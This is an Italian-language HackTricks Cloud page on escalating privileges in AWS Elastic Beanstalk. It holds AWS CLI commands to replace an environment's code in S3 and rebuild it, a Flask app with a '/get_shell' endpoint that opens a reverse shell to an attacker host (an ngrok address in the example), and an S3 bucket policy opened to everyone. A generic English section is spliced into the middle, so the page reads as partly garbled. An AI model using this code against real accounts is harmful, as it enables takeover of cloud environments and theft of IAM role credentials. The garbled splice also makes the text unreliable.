# AWS - Privilege Escalation su Elastic Beanstalk

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Elastic Beanstalk

Maggiori **informazioni su Elastic Beanstalk** in:

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Per eseguire azioni sensibili in Beanstalk sar√† necessario avere **molte autorizzazioni sensibili in molti servizi diversi**. Puoi verificare ad esempio le autorizzazioni fornite a **`arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk`**
{% endhint %}

### `elasticbeanstalk:RebuildEnvironment`, permessi di scrittura S3 e molti altri

Con **permessi di scrittura sul bucket S3** che contiene il **codice** dell'ambiente e i permessi per **ricostruire** l'applicazione (√® necessario `elasticbeanstalk:RebuildEnvironment` e alcuni altri correlati a `S3`, `EC2` e `Cloudformation`), √® possibile **modificare** il **codice**, **ricostruire** l'app e la prossima volta che si accede all'app verr√† **eseguito il nuovo codice**, consentendo all'attaccante di compromettere l'applicazione e le credenziali del ruolo IAM ad essa associate.

{% code overflow="wrap" %}
```bash
# Create folder
mkdir elasticbeanstalk-eu-west-1-947247140022
cd elasticbeanstalk-eu-west-1-947247140022
# Download code
aws s3 sync s3://elasticbeanstalk-eu-west-1-947247140022 .
# Change code
unzip 1692777270420-aws-flask-app.zip
zip 1692777270420-aws-flask-app.zip <files to zip>
# Upload code
aws s3 cp 1692777270420-aws-flask-app.zip s3://elasticbeanstalk-eu-west-1-947247140022/1692777270420-aws-flask-app.zip
# Rebuild env
aws elasticbeanstalk rebuild-environment --environment-name "env-name"
```
{% endcode %}

### `elasticbeanstalk:CreateApplication`, `elasticbeanstalk:CreateEnvironment`, `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `iam:PassRole`, e altro...

I permessi menzionati, oltre a diversi permessi per **`S3`**, **`EC2`, `cloudformation`**, **`autoscaling`** e **`elasticloadbalancing`**, sono necessari per creare uno scenario Elastic Beanstalk da zero.

* Creare un'applicazione AWS Elastic Beanstalk:
```bash
aws elasticbeanstalk create-application --application-name MyApp
```
* Creare un ambiente AWS Elastic Beanstalk ([**piattaforme supportate**](https://docs.aws.amazon.com/elasticbeanstalk/latest/platforms/platforms-supported.html#platforms-supported.python)):

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk create-environment --application-name MyApp --environment-name MyEnv --solution-stack-name "64bit Amazon Linux 2 v3.4.2 running Python 3.8" --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=aws-elasticbeanstalk-ec2-role
```
{% endcode %}

Se un ambiente √® gi√† stato creato e **non si desidera crearne uno nuovo**, √® possibile semplicemente **aggiornare** quello esistente.

* Confezionare il codice dell'applicazione e le dipendenze in un file ZIP:
```python
zip -r MyApp.zip .
```
* Carica il file ZIP in un bucket S3:
```python
aws s3 cp MyApp.zip s3://elasticbeanstalk-<region>-<accId>/MyApp.zip
```
* Creare una versione dell'applicazione AWS Elastic Beanstalk:

{% code overflow="wrap" %}
```css
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-1.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="MyApp.zip"
```
{% endcode %}

* Distribuire la versione dell'applicazione nel tuo ambiente AWS Elastic Beanstalk:

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0
```
{% endcode %}

### `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `cloudformation:GetTemplate`, `cloudformation:DescribeStackResources`, `cloudformation:DescribeStackResource`, `autoscaling:DescribeAutoScalingGroups`, `autoscaling:SuspendProcesses`, `autoscaling:SuspendProcesses`

Prima di tutto devi creare un **ambiente Beanstalk legittimo** con il **codice** che desideri eseguire nella **vittima** seguendo i **passaggi precedenti**. Potenzialmente un semplice **zip** contenente questi **2 file**:

{% tabs %}
{% tab title="application.py" %}
```python
from flask import Flask, request, jsonify
import subprocess,os, socket

application = Flask(__name__)

@application.errorhandler(404)
def page_not_found(e):
return jsonify('404')

@application.route("/")
def index():
return jsonify('Welcome!')


@application.route("/get_shell")
def search():
host=request.args.get('host')
port=request.args.get('port')
if host and port:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,int(port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
return jsonify('done')

if __name__=="__main__":
application.run()
```
{% endtab %}

{% tab title="requirements.txt" %}
```
click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
Werkzeug==1.0.1
```
{% endtab %}
{% endtabs %}

Una volta che hai **il tuo ambiente Beanstalk in esecuzione** con la tua shell inversa, √® il momento di **migrarlo** nell'ambiente della **vittima**. Per farlo, devi **aggiornare la Bucket Policy** del tuo bucket S3 di Beanstalk in modo che la **vittima possa accedervi** (Nota che questo aprir√† il Bucket a **TUTTI**):
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "eb-af163bf3-d27b-4712-b795-d1e33e331ca4",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"s3:ListBucket",
"s3:ListBucketVersions",
"s3:GetObject",
"s3:GetObjectVersion",
"s3:*"
],
"Resource": [
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022",
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022/*"
]
},
{
"Sid": "eb-58950a8c-feb6-11e2-89e0-0800277d041b",
"Effect": "Deny",
"Principal": {
"AWS": "*"
},
"Action": "s3:DeleteBucket",
"Resource": "arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022"
}
]
}
```
# AWS Elastic Beanstalk Privilege Escalation

## Introduction

AWS Elastic Beanstalk is a fully managed service that makes it easy to deploy and run applications in multiple languages. It provides a platform for deploying and scaling web applications and services.

## Privilege Escalation Techniques

### 1. Environment Variables

#### Description

Environment variables in AWS Elastic Beanstalk can be used to store sensitive information such as API keys, database credentials, and other secrets. If these environment variables are not properly secured, an attacker can escalate their privileges by accessing and extracting this sensitive information.

#### Exploitation

1. Identify the target application's environment variables by using the `eb printenv` command or by accessing the AWS Management Console.
2. Look for environment variables that may contain sensitive information.
3. Use the extracted information to gain unauthorized access or perform other malicious activities.

### 2. Misconfigured IAM Roles

#### Description

IAM roles in AWS Elastic Beanstalk define the permissions and access controls for the resources within an environment. If an IAM role is misconfigured and grants excessive privileges, an attacker can exploit this misconfiguration to escalate their privileges.

#### Exploitation

1. Identify the IAM roles associated with the target environment by using the `eb status` command or by accessing the AWS Management Console.
2. Analyze the permissions granted to each IAM role.
3. Look for misconfigurations such as overly permissive policies or unnecessary permissions.
4. Exploit the misconfigured IAM role to gain unauthorized access or perform other malicious activities.

### 3. Code Execution

#### Description

If an attacker gains the ability to execute arbitrary code within an AWS Elastic Beanstalk environment, they can use this access to escalate their privileges.

#### Exploitation

1. Identify a vulnerability or misconfiguration that allows for code execution within the target environment.
2. Exploit the vulnerability or misconfiguration to execute arbitrary code.
3. Use the executed code to gain unauthorized access or perform other malicious activities.

## Conclusion

Privilege escalation in AWS Elastic Beanstalk can occur through various techniques such as accessing sensitive environment variables, exploiting misconfigured IAM roles, or executing arbitrary code. It is important to regularly review and secure these aspects of your Elastic Beanstalk environments to prevent unauthorized access and potential data leaks.
```bash
# Use a new --version-label
# Use the bucket from your own account
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-2.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="revshell.zip"

# These step needs the extra permissions
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0

# To get your rev shell just access the exposed web URL with params such as:
http://myenv.eba-ankaia7k.us-east-1.elasticbeanstalk.com/get_shell?host=0.tcp.eu.ngrok.io&port=13528
```
{% endcode %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
